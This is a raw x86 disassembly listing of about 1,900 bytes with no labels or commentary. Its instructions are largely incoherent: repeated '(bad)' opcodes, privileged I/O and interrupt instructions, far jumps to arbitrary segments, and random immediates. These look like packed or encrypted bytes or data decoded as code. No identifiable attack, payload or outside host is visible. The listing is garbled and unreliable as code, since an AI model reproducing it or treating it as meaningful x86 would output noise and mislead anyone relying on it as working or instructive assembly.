  411817:	rol    DWORD PTR [esi+0x6f12815e],cl
  41181d:	repz mov eax,0x501f44e3
  411823:	pop    es
  411824:	test   al,0x76
  411826:	shr    BYTE PTR [ebx],0x83
  411829:	dec    esi
  41182a:	add    DWORD PTR ds:0xbbbdab3b,0xa13424f7
  411834:	out    0xf1,al
  411836:	or     BYTE PTR [ecx],ch
  411838:	mov    dh,0xbb
  41183a:	jne    0x411836
  41183c:	add    DWORD PTR [edi-0x1d6526a],ecx
  411842:	fwait
  411843:	push   ebp
  411844:	push   esp
  411845:	sahf   
  411846:	mov    eax,ds:0xf103db33
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xe380ba54
  411868:	adc    BYTE PTR [ecx],0xf4
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x4]
  411873:	test   eax,0x38a35d3
  411878:	add    ecx,ebx
  41187a:	push   eax
  41187b:	sbb    edx,DWORD PTR [edi-0x43]
  41187e:	inc    edi
  41187f:	push   esi
  411880:	jge    0x4118d9
  411882:	jb     0x4118fa
  411884:	arpl   WORD PTR [ebx+ebx*8],di
  411887:	inc    esi
  411888:	ins    BYTE PTR es:[edi],dx
  411889:	pop    ss
  41188a:	pop    edi
  41188b:	imul   edi,DWORD PTR [esi-0x7e2ea756],0xffffffcd
  411892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411893:	stos   DWORD PTR es:[edi],eax
  411894:	adc    BYTE PTR ds:0x3533dbd7,dl
  41189a:	imul   esi,DWORD PTR [ebp-0x61],0x44fe31db
  4118a1:	popa   
  4118a2:	mov    cl,0xb5
  4118a4:	imul   edx,DWORD PTR [esi],0xa4059a1c
  4118aa:	mov    eax,ds:0x712df873
  4118af:	mov    edi,ecx
  4118b1:	pop    edi
  4118b2:	repnz lock mov ecx,0xe942ffb4
  4118b9:	(bad)  
  4118bb:	push   0x1e
  4118bd:	and    DWORD PTR ds:0xeaeb3044,ebx
  4118c3:	mov    eax,ds:0x5497b63
  4118c8:	cli    
  4118c9:	iret   
  4118ca:	xchg   esi,eax
  4118cb:	and    DWORD PTR [ebx+0x571b777f],eax
  4118d1:	loope  0x411897
  4118d3:	and    DWORD PTR [edi-0x2717d0fa],ecx
  4118d9:	or     BYTE PTR [ecx+eax*1+0x20286b3f],dl
  4118e0:	cmp    ch,ah
  4118e2:	aaa    
  4118e3:	sbb    edx,DWORD PTR [eax-0x6b686e97]
  4118e9:	mov    eax,0xa14fc645
  4118ee:	add    ah,BYTE PTR [esi+0x5]
  4118f1:	data16 shl BYTE PTR [edi+0x2c50c46b],cl
  4118f8:	aaa    
  4118f9:	mov    DWORD PTR [eax],esi
  4118fb:	inc    edi
  4118fc:	mov    al,ds:0x907fce6e
  411901:	jno    0x41194d
  411903:	sbb    edi,DWORD PTR cs:[ebx+0x7b]
  411907:	cmp    DWORD PTR [ecx-0x33e155fb],esi
  41190d:	jmp    0x41193b
  41190f:	jae    0x41196f
  411911:	test   al,0x93
  411913:	sahf   
  411914:	pop    ebp
  411915:	pop    ss
  411916:	push   edx
  411917:	cmp    eax,DWORD PTR [edx]
  411919:	jb     0x4118e2
  41191b:	xor    al,0xc8
  41191d:	sbb    edi,edi
  41191f:	sub    BYTE PTR [ecx-0x3c],bl
  411922:	idiv   bl
  411924:	clc    
  411925:	add    eax,0xf28d6c61
  41192a:	imul   ebp,DWORD PTR ds:0x5752af72,0x1e
  411931:	add    eax,0x9a794fe3
  411936:	test   eax,0x918de707
  41193b:	mov    ds:0xdaa8975,al
  411940:	push   0xfffffff6
  411942:	repz sbb al,0xa
  411946:	dec    esp
  411947:	and    eax,0x42891762
  41194c:	mov    ds:0x98463cb7,al
  411951:	fimul  WORD PTR [edx+0x562d9ae5]
  411957:	std    
  411958:	aaa    
  411959:	adc    al,0x68
  41195b:	xchg   eax,esp
  41195d:	clc    
  41195e:	hlt    
  41195f:	scas   al,BYTE PTR es:[edi]
  411960:	mov    ebp,0xd8c2700e
  411965:	ret    
  411966:	(bad)  
  411967:	pop    ecx
  411968:	jmp    0x3966:0x3fc3467b
  41196f:	lea    edx,[ebp-0x67aba164]
  411975:	in     eax,dx
  411976:	jb     0x411900
  411978:	icebp  
  411979:	loop   0x411927
  41197b:	call   FWORD PTR [ebp+0x5e]
  41197e:	cmp    ch,ch
  411980:	jge    0x411952
  411982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411983:	ds xchg ebp,eax
  411985:	dec    eax
  411986:	out    0x62,al
  411988:	xchg   esp,eax
  411989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41198a:	jp     0x41191a
  41198c:	cld    
  41198d:	pushf  
  41198e:	dec    eax
  41198f:	test   DWORD PTR [edi+0x67bd1f20],0x2388cd41
  411999:	cwde   
  41199a:	dec    edi
  41199b:	pop    ds
  41199c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41199d:	sar    DWORD PTR [ecx-0x30],1
  4119a0:	sahf   
  4119a1:	jecxz  0x411a22
  4119a3:	jae    0x41199a
  4119a5:	mov    al,0xef
  4119a7:	and    cl,dh
  4119a9:	daa    
  4119aa:	sar    DWORD PTR [edx],1
  4119ac:	jge    0x4119dd
  4119ae:	adc    bl,BYTE PTR [edi+0x51]
  4119b1:	push   edi
  4119b2:	inc    esi
  4119b3:	and    DWORD PTR ds:0x131d2ebd,edi
  4119b9:	push   ebp
  4119ba:	test   DWORD PTR [eax-0x53],esi
  4119bd:	cld    
  4119be:	rol    BYTE PTR [edi-0x66c75a48],cl
  4119c4:	sbb    al,BYTE PTR [edx]
  4119c6:	lds    ebx,FWORD PTR [edi-0x73fbeffd]
  4119cc:	sub    BYTE PTR [eax+0x6bd0f37d],dl
  4119d2:	cmp    esp,DWORD PTR [esi]
  4119d4:	adc    al,0x2b
  4119d6:	xor    al,0xb7
  4119d8:	push   esi
  4119d9:	jecxz  0x411a42
  4119db:	fcomp  DWORD PTR [ecx]
  4119dd:	aam    0xfe
  4119df:	adc    DWORD PTR [edi+eax*1-0x49],eax
  4119e3:	pop    eax
  4119e4:	data16 or bl,BYTE PTR [ecx]
  4119e7:	cmp    al,0x2a
  4119e9:	jmp    0x20ab:0x64a238c8
  4119f0:	(bad)  
  4119f1:	aam    0xde
  4119f3:	imul   eax,DWORD PTR [eax-0x79],0xf508a484
  4119fa:	(bad)  
  4119fb:	pop    esp
  4119fc:	sub    BYTE PTR [ebp-0x65],ch
  4119ff:	cmp    eax,0x6193ecbc
  411a04:	outs   dx,DWORD PTR ds:[esi]
  411a05:	mov    esi,0x91f6bc20
  411a0a:	mov    dh,0x94
  411a0c:	stc    
  411a0d:	jnp    0x411a6c
  411a0f:	sbb    edx,DWORD PTR [ebx+0x22]
  411a12:	jmp    0x4119f5
  411a14:	adc    edi,DWORD PTR [eax+0xf877237]
  411a1a:	arpl   WORD PTR [ebx],di
  411a1c:	fdivrp st(7),st
  411a1e:	shl    DWORD PTR [ebp-0x4b],0x3e
  411a22:	adc    BYTE PTR [ebx+0x5f],ah
  411a25:	xchg   DWORD PTR [ebp+0x64a4595a],ebp
  411a2b:	repz pop eax
  411a2d:	mov    ebx,0x9e6822d1
  411a32:	je     0x411a5a
  411a34:	push   esp
  411a35:	mul    BYTE PTR [edx-0xd]
  411a38:	sbb    al,0xf5
  411a3a:	mov    ds:0x17708795,al
  411a3f:	jo     0x4119ee
  411a41:	push   cs
  411a42:	(bad)  
  411a43:	lods   al,BYTE PTR ds:[esi]
  411a44:	loop   0x411a42
  411a46:	inc    eax
  411a47:	push   ds
  411a48:	pop    ecx
  411a49:	dec    ecx
  411a4a:	rcl    DWORD PTR ds:0xc80a4e6d,1
  411a50:	inc    edx
  411a51:	or     BYTE PTR ds:0xc0f87a15,0x8
  411a58:	out    0x7,al
  411a5a:	popf   
  411a5b:	sub    DWORD PTR [edi-0xb],0x21
  411a5f:	mov    BYTE PTR [eax+0x55],al
  411a62:	or     ah,bh
  411a64:	outs   dx,DWORD PTR ds:[esi]
  411a65:	cmc    
  411a66:	out    dx,al
  411a67:	xor    eax,DWORD PTR [edx+ebx*2+0x3cff478d]
  411a6e:	adc    al,0xea
  411a70:	xchg   edi,eax
  411a71:	cmc    
  411a72:	and    ch,dh
  411a74:	ret    0x2fbc
  411a77:	xchg   ebp,eax
  411a78:	cli    
  411a79:	add    dh,BYTE PTR [ecx]
  411a7b:	pop    ebp
  411a7c:	adc    dl,al
  411a7e:	cli    
  411a7f:	lea    edi,[esi]
  411a81:	fcom   DWORD PTR [ebp+0x11c0020a]
  411a87:	scas   eax,DWORD PTR es:[edi]
  411a88:	leave  
  411a89:	fwait
  411a8a:	pop    ebx
  411a8b:	cs sub DWORD PTR gs:[ebx],eax
  411a8f:	xor    eax,0xff48b7db
  411a94:	icebp  
  411a95:	cli    
  411a96:	and    BYTE PTR [eax],0xf
  411a99:	loope  0x411a9b
  411a9b:	sbb    al,0x3
  411a9d:	in     al,0x2
  411a9f:	jne    0x411b13
  411aa1:	mov    ds:0x74eeda06,al
  411aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa7:	pop    eax
  411aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aa9:	add    al,0x61
  411aab:	ja     0x411a65
  411aad:	cmc    
  411aae:	sbb    edx,ebx
  411ab0:	mov    al,ds:0xbfbc8b56
  411ab5:	mov    esi,DWORD PTR ds:[esi+0x394051d3]
  411abc:	call   DWORD PTR [esi+eax*8-0x2cb26502]
  411ac3:	mov    dl,0x12
  411ac5:	add    esi,ebp
  411ac7:	sub    BYTE PTR [edx+0x6173edf5],dl
  411acd:	inc    eax
  411ace:	daa    
  411acf:	fld    TBYTE PTR [ebx]
  411ad1:	loopne 0x411b04
  411ad3:	ror    BYTE PTR [edx],1
  411ad5:	sbb    esi,DWORD PTR [ebp+0x5e]
  411ad8:	nop
  411ad9:	cwde   
  411ada:	sub    al,0xe8
  411adc:	xchg   ebx,eax
  411add:	rcl    dl,1
  411adf:	or     al,0xd
  411ae1:	or     ebp,0x9c31105f
  411ae7:	pop    edx
  411ae8:	fs retf 
  411aea:	test   eax,0xce174c4c
  411aef:	jmp    0x411b6a
  411af1:	mov    al,ds:0xfbc09628
  411af6:	xchg   ebp,eax
  411af7:	or     DWORD PTR [edx+ebx*8-0x5239779c],ebx
  411afe:	dec    esp
  411aff:	inc    esp
  411b00:	add    eax,0xfd1f2a6
  411b05:	jns    0x411a8c
  411b07:	or     edi,esp
  411b09:	sub    ebx,DWORD PTR [edi-0x3005b506]
  411b0f:	rol    BYTE PTR [edi+edi*2],1
  411b12:	xchg   edx,eax
  411b13:	adc    al,0x8f
  411b15:	sahf   
  411b16:	dec    esp
  411b17:	jg     0x411b1a
  411b19:	push   eax
  411b1a:	push   ebp
  411b1b:	xchg   ebx,eax
  411b1c:	xor    al,0x24
  411b1e:	mov    al,ds:0xfa9176cf
  411b23:	push   DWORD PTR [edx]
  411b25:	sub    ebp,0x6d611958
  411b2b:	mov    ch,bl
  411b2d:	enter  0x6092,0xc5
  411b31:	jne    0x411ad4
  411b33:	mov    ebx,0x4d9e7414
  411b38:	lods   al,BYTE PTR ds:[esi]
  411b39:	scas   al,BYTE PTR es:[edi]
  411b3a:	and    eax,0xa00c0e6f
  411b3f:	pushf  
  411b40:	shl    BYTE PTR [edx+0x5c22a729],1
  411b46:	in     al,0x77
  411b48:	mov    bl,BYTE PTR [ebx]
  411b4a:	add    eax,DWORD PTR [esi]
  411b4c:	lds    esi,FWORD PTR [edx+0x60f87a31]
  411b52:	adc    BYTE PTR [eax],dl
  411b54:	out    0xf,al
  411b56:	pop    ebp
  411b57:	les    ebp,FWORD PTR [edi+0x7f500b98]
  411b5d:	dec    esp
  411b5e:	retf   
  411b5f:	cdq    
  411b60:	or     edx,DWORD PTR [edx+0xf5db8ac]
  411b66:	jmp    0x411b64
  411b68:	jne    0x411b7e
  411b6a:	ja     0x411b4a
  411b6c:	jle    0x411b09
  411b6e:	push   cs
  411b6f:	ret    
  411b70:	pop    esi
  411b71:	cmp    BYTE PTR [edx-0x759543be],cl
  411b77:	xchg   edi,eax
  411b78:	sub    eax,0x6bdbf755
  411b7d:	pop    esi
  411b7e:	push   ecx
  411b7f:	ror    eax,0x8b
  411b82:	sbb    bh,BYTE PTR [edx]
  411b84:	mov    ch,0xf4
  411b86:	loopne 0x411b46
  411b88:	jg     0x411b43
  411b8a:	add    al,0x4a
  411b8c:	pop    ds
  411b8d:	mov    bl,0x89
  411b8f:	cmc    
  411b90:	add    cl,ah
  411b92:	cmc    
  411b93:	imul   edx,ebp,0xddd099f7
  411b99:	mov    al,BYTE PTR [ecx+0x5d]
  411b9c:	jg     0x411b39
  411b9e:	cmp    DWORD PTR [eax],ecx
  411ba0:	popa   
  411ba1:	jns    0xbf6a6151
  411ba7:	stos   BYTE PTR es:[edi],al
  411ba8:	sbb    bh,BYTE PTR [edi-0x2f]
  411bab:	into   
  411bac:	addr16 inc edx
  411bae:	gs js  0x411bed
  411bb1:	stc    
  411bb2:	xor    al,0xbb
  411bb4:	imul   esp,DWORD PTR [ebp+0x4d9a6170],0x93a2cee8
  411bbe:	jae    0x411be4
  411bc0:	mov    eax,ds:0x55f45cc1
  411bc5:	cmp    al,al
  411bc7:	push   edi
  411bc8:	push   esi
  411bc9:	nop
  411bca:	call   0x808fc2ab
  411bcf:	add    eax,edi
  411bd1:	out    dx,al
  411bd2:	cld    
  411bd3:	fidiv  WORD PTR [ecx+ebx*4-0x25]
  411bd7:	push   edx
  411bd8:	arpl   dx,ax
  411bda:	in     al,0x82
  411bdc:	out    0x7f,al
  411bde:	inc    edi
  411bdf:	cmp    ch,bh
  411be1:	rcl    DWORD PTR [ebx],0x87
  411be4:	ja     0x411c51
  411be6:	frstor [eax-0x74af09f6]
  411bec:	mov    al,0xee
  411bee:	test   al,0x2a
  411bf0:	(bad)  
  411bf1:	cmc    
  411bf2:	inc    ebx
  411bf3:	xchg   ebx,ebx
  411bf5:	retf   0x6aca
  411bf8:	cmp    cl,BYTE PTR [edi+eax*2]
  411bfb:	gs scas eax,DWORD PTR es:[edi]
  411bfd:	xor    al,0x35
  411bff:	pop    ebx
  411c00:	jmp    0x411be1
  411c02:	cmp    ebx,edi
  411c04:	pop    ss
  411c05:	xchg   ecx,eax
  411c06:	test   al,0x78
  411c08:	jmp    0xf6fa5af8
  411c0d:	pop    eax
  411c0e:	jmp    0xbcc5:0xddc9079c
  411c15:	lock imul ebx,DWORD PTR [ebx],0xffffffbe
  411c19:	sahf   
  411c1a:	gs cmp al,0x62
  411c1d:	or     edi,DWORD PTR [edx-0x10dd3fec]
  411c23:	xor    ecx,DWORD PTR [edx]
  411c25:	in     al,dx
  411c26:	je     0x411c0a
  411c28:	jge    0x411c84
  411c2a:	jl     0x411c7c
  411c2c:	and    eax,0x3ac1bd0e
  411c31:	loop   0x411be4
  411c33:	shl    BYTE PTR [eax],0xf7
  411c36:	cs jns 0x411c64
  411c39:	popf   
  411c3a:	out    dx,eax
  411c3b:	sbb    ebx,DWORD PTR [ecx+0xf54027d]
  411c41:	jecxz  0x411bce
  411c43:	(bad)  
  411c45:	jge    0x411caa
  411c47:	(bad)  
  411c48:	out    dx,eax
  411c49:	sub    eax,0x6d5a0ee
  411c4e:	hlt    
  411c4f:	das    
  411c50:	out    dx,al
  411c51:	mov    ecx,0x408121d2
  411c56:	bound  ebx,QWORD PTR [ebx]
  411c58:	rcl    DWORD PTR [ebx+0x7c],0x77
  411c5c:	mov    eax,0xe7ed561d
  411c61:	out    0x6f,eax
  411c63:	data16 int3 
  411c65:	cli    
  411c66:	into   
  411c67:	jo     0x411cc7
  411c69:	jne    0x411cd9
  411c6b:	and    BYTE PTR [edi-0x4b],ah
  411c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c6f:	mov    dl,cl
  411c71:	pop    eax
  411c72:	inc    ebp
  411c73:	adc    DWORD PTR [ecx-0x2ac8adf1],esp
  411c79:	cmc    
  411c7a:	mov    edi,0x8a035c48
  411c7f:	lods   eax,DWORD PTR ds:[esi]
  411c80:	imul   edx,DWORD PTR [ebp+0x56],0xffffffda
  411c84:	jno    0x411c20
  411c86:	sti    
  411c87:	inc    eax
  411c88:	fdiv   DWORD PTR [edx]
  411c8a:	in     eax,0xe7
  411c8c:	ja     0x411ce2
  411c8e:	pusha  
  411c8f:	or     al,0x21
  411c91:	jbe    0x411c58
  411c93:	ret    
  411c94:	outs   dx,BYTE PTR ds:[esi]
  411c95:	ror    DWORD PTR [edx-0x48beb253],cl
  411c9b:	pop    ss
  411c9c:	rcl    BYTE PTR [edx],cl
  411c9e:	sub    al,BYTE PTR [esi]
  411ca0:	sub    edi,esp
  411ca2:	pusha  
  411ca3:	cmp    eax,0x4e6ae7d9
  411ca8:	popf   
  411ca9:	ins    DWORD PTR es:[edi],dx
  411caa:	sbb    dh,BYTE PTR [ebp-0x2204a84d]
  411cb0:	or     BYTE PTR [ecx],dh
  411cb2:	out    dx,eax
  411cb3:	jo     0x411d2e
  411cb5:	outs   dx,DWORD PTR ds:[esi]
  411cb6:	ror    BYTE PTR [ecx-0x559fcdda],1
  411cbc:	adc    bl,bh
  411cbe:	push   ss
  411cbf:	sbb    bh,al
  411cc1:	dec    edx
  411cc2:	cld    
  411cc3:	test   al,0x59
  411cc5:	cdq    
  411cc6:	xor    BYTE PTR [edi+0x7e6bca45],0x12
  411ccd:	add    ebx,ecx
  411ccf:	out    0x69,al
  411cd1:	int3   
  411cd2:	gs pop es
  411cd4:	in     al,0xa5
  411cd6:	inc    edi
  411cd7:	mov    DWORD PTR [edi+ebp*4-0x137637f1],0xf2551df
  411ce2:	sub    bl,al
  411ce4:	mov    bl,cl
  411ce6:	xchg   edx,eax
  411ce7:	mov    edx,DWORD PTR [ebx]
  411ce9:	pop    esi
  411cea:	cmp    eax,0x35c893dd
  411cef:	mov    ah,0x71
  411cf1:	cwde   
  411cf2:	int    0x53
  411cf4:	add    esi,edi
  411cf6:	pop    ebx
  411cf7:	mov    WORD PTR [ecx-0x37e04e65],?
  411cfd:	xor    ebp,ebx
  411cff:	add    al,0xfd
  411d01:	cdq    
  411d02:	stos   BYTE PTR es:[edi],al
  411d03:	mov    gs,WORD PTR [edi-0x3f]
  411d06:	mov    dh,0x2d
  411d08:	int    0x6b
  411d0a:	lods   al,BYTE PTR ds:[esi]
  411d0b:	pop    es
  411d0c:	in     eax,dx
  411d0d:	dec    eax
  411d0e:	jg     0x411d55
  411d10:	test   eax,0x6aa83ec7
  411d15:	push   esi
  411d16:	pop    edi
  411d17:	lahf   
  411d18:	cmp    BYTE PTR [esi],ah
  411d1a:	cmp    al,0x10
  411d1c:	inc    edi
  411d1d:	sub    esp,DWORD PTR [eax-0x72]
  411d20:	pop    es
  411d21:	jge    0x411d12
  411d23:	mov    edi,edi
  411d25:	rcl    BYTE PTR [esi],cl
  411d27:	sbb    BYTE PTR [edi],ch
  411d29:	jo     0x411d8f
  411d2b:	(bad)  [ebx]
  411d2d:	cmp    DWORD PTR ds:0xc875e1e3,ecx
  411d33:	stos   BYTE PTR es:[edi],al
  411d34:	xor    edx,ebp
  411d36:	sub    DWORD PTR [edx],ebx
  411d38:	push   cs
  411d39:	adc    al,bh
  411d3b:	mov    ecx,0x625187e2
  411d40:	iret   
  411d41:	scas   al,BYTE PTR es:[edi]
  411d42:	pop    esi
  411d43:	scas   al,BYTE PTR es:[edi]
  411d44:	adc    bh,BYTE PTR [eax]
  411d46:	scas   eax,DWORD PTR es:[edi]
  411d47:	lods   al,BYTE PTR ds:[esi]
  411d48:	jno    0x411dc5
  411d4a:	xchg   esp,eax
  411d4b:	(bad)  [esp+eax*4+0x50fed711]
  411d52:	cli    
  411d53:	stc    
  411d54:	repz ret 0xffbf
  411d58:	pop    esi
  411d59:	out    0x84,eax
  411d5b:	cmp    ebx,DWORD PTR [ebp+0x7aea03de]
  411d61:	sbb    DWORD PTR [ebx+0x195084a8],0x37d4d5e4
  411d6b:	jns    0x411d2a
  411d6d:	popf   
  411d6e:	mov    cl,0x2e
  411d70:	test   DWORD PTR [edi+ebp*1-0x73],ebx
  411d74:	pop    ebp
  411d75:	push   ecx
  411d76:	iret   
  411d77:	and    DWORD PTR [ebp-0x313d461],ebx
  411d7d:	add    al,0xc0
  411d7f:	shl    ebx,cl
  411d81:	xor    BYTE PTR [eax],bh
  411d83:	leave  
  411d84:	ss call 0x566b:0x6acd6ea7
  411d8c:	push   esp
  411d8d:	pop    esp
  411d8e:	inc    eax
  411d8f:	cs inc eax
  411d91:	dec    esi
  411d92:	int3   
  411d93:	cwde   
  411d94:	or     ecx,DWORD PTR [ebx-0x5e875acf]
  411d9a:	jl     0x411d75
  411d9c:	das    
  411d9d:	sub    eax,0x4376cdf3
  411da2:	adc    ebp,DWORD PTR [edi+0x5ff0e11b]
  411da8:	jp     0x411e12
  411daa:	in     eax,0xba
  411dac:	dec    ebx
  411dad:	adc    BYTE PTR [edx-0x52782cd9],0xf8
  411db4:	out    0x96,al
  411db6:	retf   
  411db7:	nop
  411db8:	scas   eax,DWORD PTR es:[edi]
  411db9:	push   ebp
  411dba:	dec    esi
  411dbb:	cmp    DWORD PTR [ecx+edx*8],eax
  411dbe:	adc    esi,0xfffffff0
  411dc1:	cmp    BYTE PTR [ecx+0x46],0xb8
  411dc5:	push   0x87097b93
  411dca:	fnstenv [esi+0x27]
  411dcd:	jno    0x411e02
  411dcf:	aad    0xdf
  411dd1:	adc    esp,esi
  411dd3:	ror    DWORD PTR [ecx-0x48],1
  411dd6:	adc    BYTE PTR [eax+0x164050d0],bh
  411ddc:	retf   
  411ddd:	(bad)  
  411dde:	push   cs
  411ddf:	pop    ecx
  411de0:	mov    edi,0xaf5148e4
  411de5:	jbe    0x411e5c
  411de7:	mov    dl,0xff
  411de9:	push   edi
  411dea:	lods   al,BYTE PTR ds:[esi]
  411deb:	mov    cl,BYTE PTR [esi]
  411ded:	sbb    eax,0x7aeca6d6
  411df2:	es adc edx,edi
  411df5:	sbb    eax,0xbe77de3
  411dfa:	sub    dh,BYTE PTR [eax]
  411dfc:	inc    esp
  411dfd:	test   DWORD PTR [edi+0x50557d65],edx
  411e03:	mov    eax,0x7ab36324
  411e08:	mov    ebx,0xf7d297c2
  411e0d:	push   esi
  411e0e:	push   ecx
  411e0f:	cli    
  411e10:	push   edi
  411e11:	call   0xeb538279
  411e16:	cld    
  411e17:	lea    eax,[edx-0x73]
  411e1a:	and    eax,ebp
  411e1c:	jecxz  0x411df0
  411e1e:	mov    eax,0x733d8872
  411e23:	adc    eax,0xe1991d8b
  411e28:	push   0xfffffff9
  411e2a:	nop
  411e2b:	mov    bl,BYTE PTR [ebp-0x29]
  411e2e:	and    esi,DWORD PTR [ecx+0x17]
  411e31:	stos   BYTE PTR es:[edi],al
  411e32:	dec    eax
  411e33:	mov    ds:0xa7d25c23,al
  411e38:	dec    edx
  411e39:	cmp    al,0x6f
  411e3b:	cmp    BYTE PTR [edx-0x26ae7864],dh
  411e41:	and    al,0x55
  411e43:	push   cs
  411e44:	push   esi
  411e45:	cmp    ecx,ebp
  411e47:	call   0x88fd:0x2e245868
  411e4e:	adc    dh,BYTE PTR [ecx-0x47670c6c]
  411e54:	pop    eax
  411e55:	mov    dl,0x55
  411e57:	pop    edx
  411e58:	inc    edx
  411e59:	(bad)  
  411e5b:	sub    DWORD PTR ds:0x18dfeca4,esi
  411e61:	cld    
  411e62:	mov    dh,0x3b
  411e64:	cmp    dl,dl
  411e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e67:	ds sub al,0x35
  411e6a:	jge    0x411e94
  411e6c:	or     bh,ah
  411e6e:	pop    ebp
  411e6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e70:	sahf   
  411e71:	xchg   BYTE PTR [eax-0x540ca617],dl
  411e77:	adc    al,0xf3
  411e79:	lahf   
  411e7a:	push   edx
  411e7b:	shr    DWORD PTR [esi-0x74c0efe1],1
  411e81:	(bad)  
  411e82:	push   cs
  411e83:	nop
  411e84:	imul   esi,DWORD PTR [esp+edi*2+0x9],0x4ad3cc4b
  411e8c:	dec    ebp
  411e8d:	or     al,0x22
  411e8f:	enter  0x4dca,0xa1
  411e93:	mov    ch,0x9b
  411e95:	xor    esp,DWORD PTR [edx+eiz*2-0x17]
  411e99:	dec    edx
  411e9a:	sbb    dl,bh
  411e9c:	fsubr  DWORD PTR [esi-0x72b896e2]
  411ea2:	sbb    ebx,DWORD PTR [edi]
  411ea4:	pop    edi
  411ea5:	icebp  
  411ea6:	ds js  0x411ed6
  411ea9:	and    bl,dl
  411eab:	jle    0x411f17
  411ead:	ret    0xf1df
  411eb0:	cli    
  411eb1:	dec    eax
  411eb2:	push   es
  411eb3:	popa   
  411eb4:	pop    ds
  411eb5:	test   ebp,eax
  411eb7:	adc    ch,BYTE PTR [esi]
  411eb9:	aaa    
  411eba:	stos   BYTE PTR es:[edi],al
  411ebb:	mov    cl,0x70
  411ebd:	mov    BYTE PTR [esi],bl
  411ebf:	(bad)  
  411ec0:	shl    BYTE PTR [eax+eiz*4+0x3465021],cl
  411ec7:	jbe    0x411eef
  411ec9:	out    dx,al
  411eca:	les    ecx,FWORD PTR [edx]
  411ecc:	pop    esi
  411ecd:	xor    BYTE PTR [edx+ecx*4+0x7c4278b1],0x1f
  411ed5:	push   esp
  411ed6:	fsubr  DWORD PTR [ebx-0x87d645d]
  411edc:	inc    esi
  411edd:	retf   
  411ede:	mov    dl,0xa7
  411ee0:	in     eax,0xed
  411ee2:	or     bl,BYTE PTR [ecx-0x3ef2793f]
  411ee8:	ja     0x411ece
  411eea:	xor    edi,esi
  411eec:	xor    edi,esi
  411eee:	push   cs
  411eef:	cmc    
  411ef0:	sbb    BYTE PTR [ecx+0x34],al
  411ef3:	inc    ecx
  411ef4:	loope  0x411ec2
  411ef6:	add    al,0xe7
  411ef8:	or     eax,0x92329a58
  411efd:	mov    cl,0xcb
  411eff:	scas   al,BYTE PTR es:[edi]
  411f00:	sub    bp,cx
  411f03:	int3   
  411f04:	add    al,0xd9
  411f06:	out    0x2,al
  411f08:	inc    edx
  411f09:	jo     0x411f64
  411f0b:	cmp    bl,BYTE PTR [ebp-0x45]
  411f0e:	sbb    DWORD PTR [ebx+0x6f],0xae79bbcf
  411f15:	popf   
  411f16:	jmp    0x411f47
  411f18:	sbb    esi,DWORD PTR [esi+0x121c6edd]
  411f1e:	fadd   DWORD PTR [ebp-0x61]
  411f21:	ja     0x411f98
  411f23:	cwde   
  411f24:	ds pop esi
  411f26:	push   ecx
  411f27:	sub    al,0x9c
  411f29:	lds    ecx,FWORD PTR ds:0xe765df4c
  411f2f:	pop    edx
  411f30:	adc    al,0x6f
  411f32:	call   0x96ab:0xb5f1bdaa
  411f39:	xlat   BYTE PTR ds:[bx]
  411f3b:	or     ebp,DWORD PTR ds:[edx+0x62]
  411f3f:	and    edi,ecx
  411f41:	pop    es
  411f42:	ret    0x5121
  411f45:	ja     0x411ee7
  411f47:	or     al,0x7
  411f49:	mov    ch,0x73
  411f4b:	jle    0x411f2d
  411f4d:	aaa    
  411f4e:	out    0x97,eax
  411f50:	inc    esp
  411f51:	mov    eax,0x492e0f7b
  411f56:	mov    bh,0x4
  411f58:	or     DWORD PTR [ebx+ecx*1+0x39],edi
  411f5c:	lea    esp,[ebp+0x4562bd1e]
  411f62:	outs   dx,BYTE PTR ds:[esi]
  411f63:	push   edi
  411f64:	scas   al,BYTE PTR es:[edi]
  411f65:	inc    eax
  411f66:	pop    edx
  411f67:	sahf   
  411f68:	dec    edi
  411f69:	hlt    
  411f6a:	fidivr DWORD PTR [eax+ebp*1+0xd]
  411f6e:	shl    DWORD PTR ds:[ebp+0x49f2b59d],1
  411f75:	imul   ebp,DWORD PTR [ecx+0x7e],0x3921ebf6
  411f7c:	lods   al,BYTE PTR ds:[esi]
  411f7d:	addr16 leave 
  411f7f:	fstp   TBYTE PTR ds:0x9c575562
  411f85:	mov    ds:0x3c2c481d,eax
  411f8a:	mov    bl,0x9d
  411f8c:	jns    0x411f45
  411f8e:	mov    bl,BYTE PTR [esi+ebp*4]
  411f91:	xor    BYTE PTR [edx+0x6c0abca],cl
  411f97:	sub    BYTE PTR [esi],0x22
  411f9a:	cmp    al,0xcc
  411f9c:	test   BYTE PTR cs:[eax-0x2ac0288e],cl
  411fa3:	push   esp
  411fa4:	pop    ss
  411fa5:	pop    ds
  411fa6:	sbb    esi,ebx
  411fa8:	xor    al,ch
  411faa:	jg     0x411f94
  411fac:	(bad)  
  411fad:	imul   BYTE PTR [ecx-0x425f0b99]
  411fb3:	aas    
  411fb4:	sub    esp,ecx
  411fb6:	cmp    dl,BYTE PTR [ebp+0x73]
  411fb9:	sub    esi,DWORD PTR [esi]
  411fbb:	fs cld 
  411fbd:	arpl   WORD PTR [ebx+0x632902f2],ax
  411fc3:	push   es
  411fc4:	xor    al,0x82
  411fc6:	jo     0x411fdc
  411fc8:	jae    0x411fcc
  411fca:	ins    BYTE PTR es:[edi],dx
  411fcb:	push   ss
  411fcc:	outs   dx,DWORD PTR ds:[esi]
  411fcd:	cmp    bl,dl
  411fcf:	sub    BYTE PTR gs:[esi+0x73],dl
  411fd3:	adc    ecx,0xffffff94
  411fd6:	aas    
  411fd7:	sbb    edx,eax
  411fd9:	add    al,0x3d
  411fdb:	adc    eax,0x5b714162
